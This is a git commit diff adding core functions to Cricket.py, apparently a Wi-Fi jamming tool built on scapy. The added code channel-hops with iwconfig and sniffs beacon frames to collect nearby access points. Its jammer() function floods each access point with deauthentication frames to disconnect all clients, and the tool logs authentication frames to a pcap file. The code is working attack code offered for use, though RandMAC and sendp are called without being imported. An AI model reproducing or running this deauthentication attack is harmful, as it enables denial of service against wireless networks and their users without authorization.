39e612b08df4326551ce6a407a3d026bff55cb1d
BraffZacklin <BraffZacklin@protonmail.com>
2020-07-29 17:40:32 +0800

    Removed unnecessary formatting

--- Cricket.py
+++ Cricket.py
@@ -1,7 +1,11 @@
 #!/bin/python3
 import argparse
 import threading
-from Functions import *
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
+from scapy.utils import PcapWriter
+from scapy.sendrecv import sniff
+from subprocess import Popen
+from time import sleep
 
 global AP_list
 AP_list = []
@@ -34,6 +38,9 @@ if args.verbose == True:
 			for x in details:
 				statement += "\n\t\t\t" + x
 		print(statement)
+else:
+	def verboseOutput(status, output, *details):
+		return None
 
 if args.list:
 	ignore_AP = args.list
@@ -43,6 +50,40 @@ elif args.file:
 
 if args.output:
 	output = PcapWriter(args.output, append=True)
+
+def changeChannel(iface, channel):
+	command = ['iwconfig', iface, 'channel', str(channel)]
+	Popen(command, shell=False)
+
+def channelHop(iface, channels):
+	while True:
+		for channel in channels:
+			changeChannel(iface, channel)
+			sleep(1)
+
+def jammer():
+	if len(AP_list) != 0:
+		for AP in AP_list:
+			verboseOutput(1, f'De-Authenticating All Clients on AP {AP}')
+			DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
+			sendp(DeAuth_Frame)
+
+def packetHandler(packet):
+	print("Found packet")
+	if packet.haslayer(Dot11):
+		if packet.addr2 not in ignore_AP:
+			if packet.type == 0:
+				verboseOutput(1, f'Found Management Frame')
+				if packet.subtype == 8:
+					verboseOutput(1, f'Found Beacon Frame')
+					if packet.addr2 not in AP_list:
+						AP_list.append(packet.addr2)
+						verboseOutput(1, f'Access Point Found: {packet.addr2}')
+				elif packet.subtype == 11:
+					verboseOutput(1, f'Found Authentication Frame')
+					if output:
+						output.write(packet)
+						verboseOutput(1, f'Authentication Frame Found for AP {packet.addr2}')
 
 channelHopper = threading.Thread(target = channelHop, args=(args.interface, args.channels))
 beaconSniffer = threading.Thread(target = sniff, kwargs = dict(prn=packetHandler, iface=args.interface))
